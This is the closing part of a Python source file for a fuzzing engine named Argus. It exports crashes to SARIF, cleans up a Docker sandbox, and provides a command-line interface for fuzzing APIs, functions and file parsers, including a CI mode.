                "level": "error" if crash.severity in ["critical", "high"] else "warning",
                "message": {
                    "text": f"Fuzzing found {crash.crash_type}: {crash.stack_trace[:200]}"
                },
                "properties": {
                    "crash_id": crash.crash_id,
                    "input": crash.input_data[:500],
                    "crash_type": crash.crash_type,
                    "severity": crash.severity,
                    "reproducible": crash.reproducible
                }
            }
            sarif["runs"][0]["results"].append(result)

        with open(output_file, 'w') as f:
            json.dump(sarif, f, indent=2)

        logger.info(f"Exported {len(crashes)} crashes to SARIF: {output_file}")

    def cleanup(self):
        """Clean up fuzzing engine resources"""
        if self.sandbox:
            logger.info("Cleaning up Docker sandbox...")
            try:
                self.sandbox.cleanup()
            except Exception as e:
                logger.warning(f"Failed to cleanup sandbox: {e}")

    def __del__(self):
        """Destructor - ensure cleanup"""
        self.cleanup()


def main():
    """CLI entry point"""
    parser = argparse.ArgumentParser(description="Argus Intelligent Fuzzing Engine")
    subparsers = parser.add_subparsers(dest='command', help='Fuzzing command')

    # API fuzzing
    api_parser = subparsers.add_parser('api', help='Fuzz API endpoints')
    api_parser.add_argument('--spec', required=True, help='OpenAPI spec file')
    api_parser.add_argument('--duration', type=int, default=60, help='Duration in minutes')
    api_parser.add_argument('--base-url', help='Base URL override')
    api_parser.add_argument('--no-verify-ssl', action='store_true', help='Disable SSL verification')
    api_parser.add_argument('--output', default='fuzz_results.json', help='Output file')

    # Function fuzzing
    func_parser = subparsers.add_parser('function', help='Fuzz Python function')
    func_parser.add_argument('--target', required=True, help='Path:function (e.g., src/parser.py:parse_xml)')
    func_parser.add_argument('--duration', type=int, default=30, help='Duration in minutes')
    func_parser.add_argument('--sast-findings', help='SAST findings JSON file')
    func_parser.add_argument('--output', default='fuzz_results.json', help='Output file')
    func_parser.add_argument('--no-sandbox', action='store_true', help='Disable Docker sandbox (UNSAFE!)')

    # File parser fuzzing
    parser_parser = subparsers.add_parser('parser', help='Fuzz file parser')
    parser_parser.add_argument('--target', required=True, help='Path:function')
    parser_parser.add_argument('--file-type', required=True, choices=['json', 'xml', 'csv', 'pdf', 'image'])
    parser_parser.add_argument('--duration', type=int, default=30, help='Duration in minutes')
    parser_parser.add_argument('--output', default='fuzz_results.json', help='Output file')
    parser_parser.add_argument('--no-sandbox', action='store_true', help='Disable Docker sandbox (UNSAFE!)')

    # CI mode
    ci_parser = subparsers.add_parser('ci', help='Quick fuzzing for CI/CD')
    ci_parser.add_argument('--budget', default='5min', help='Time budget (e.g., 5min, 30min, 1hr)')
    ci_parser.add_argument('--output', default='fuzz_results.json', help='Output file')

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return 1

    # Build config based on arguments
    config = None
    if args.command in ('function', 'parser'):
        use_sandbox = not getattr(args, 'no_sandbox', False)
        if not use_sandbox:
            logger.warning("⚠️  SANDBOX DISABLED - Running in UNSAFE mode!")
            logger.warning("⚠️  Untrusted code will execute directly on your system!")

        config = FuzzConfig(
            target=FuzzTarget.PYTHON_FUNCTION,
            target_path="",
            use_sandbox=use_sandbox,
            timeout_seconds=getattr(args, 'duration', 30) * 60
        )

    # Initialize engine
    engine = FuzzingEngine(config=config)

    try:
        if args.command == 'api':
            result = engine.fuzz_api(
                args.spec,
                duration_minutes=args.duration,
                base_url=args.base_url,
                verify_ssl=not args.no_verify_ssl
            )

        elif args.command == 'function':
            path, func = args.target.split(':')
            sast_findings = None
            if args.sast_findings:
                with open(args.sast_findings) as f:
                    sast_findings = json.load(f)

            result = engine.fuzz_function(
                path, func,
                duration_minutes=args.duration,
                sast_findings=sast_findings
            )

        elif args.command == 'parser':
            path, func = args.target.split(':')
            result = engine.fuzz_file_parser(
                path, func,
                file_type=args.file_type,
                duration_minutes=args.duration
            )

        elif args.command == 'ci':
            # Parse budget
            budget_map = {'5min': 5, '30min': 30, '1hr': 60}
            duration = budget_map.get(args.budget, 5)

            # Quick API fuzz if spec exists
            if Path('openapi.yaml').exists():
                result = engine.fuzz_api('openapi.yaml', duration_minutes=duration)
            else:
                logger.error("No OpenAPI spec found for CI fuzzing")
                return 1

        # Save results
        output_path = Path(args.output)
        with open(output_path, 'w') as f:
            json.dump(result.to_dict(), f, indent=2)

        # Also export to SARIF
        sarif_path = output_path.with_suffix('.sarif')
        engine.export_crashes_to_sarif(result.crashes, sarif_path)

        # Print summary
        print(f"\n{'='*60}")
        print(f"Fuzzing Results: {result.target}")
        print(f"{'='*60}")
        print(f"Duration: {result.duration_seconds}s")
        print(f"Iterations: {result.total_iterations:,}")
        print(f"Exec/sec: {result.executions_per_second:.1f}")
        print(f"Unique crashes: {result.unique_crashes}")
        print(f"Coverage: {result.coverage:.1f}%")
        print(f"\nResults saved to: {output_path}")
        print(f"SARIF saved to: {sarif_path}")

        if result.crashes:
            print(f"\n⚠️  Found {len(result.crashes)} crashes!")
            for crash in result.crashes[:5]:
                print(f"  - {crash.crash_id}: {crash.crash_type} ({crash.severity}) - {crash.cwe}")

        return 0 if result.unique_crashes == 0 else 1

    except Exception as e:
        logger.error(f"Fuzzing failed: {e}")
        logger.debug(traceback.format_exc())
        return 2

    finally:
        # Always cleanup
        if engine:
            engine.cleanup()


if __name__ == '__main__':
    sys.exit(main())
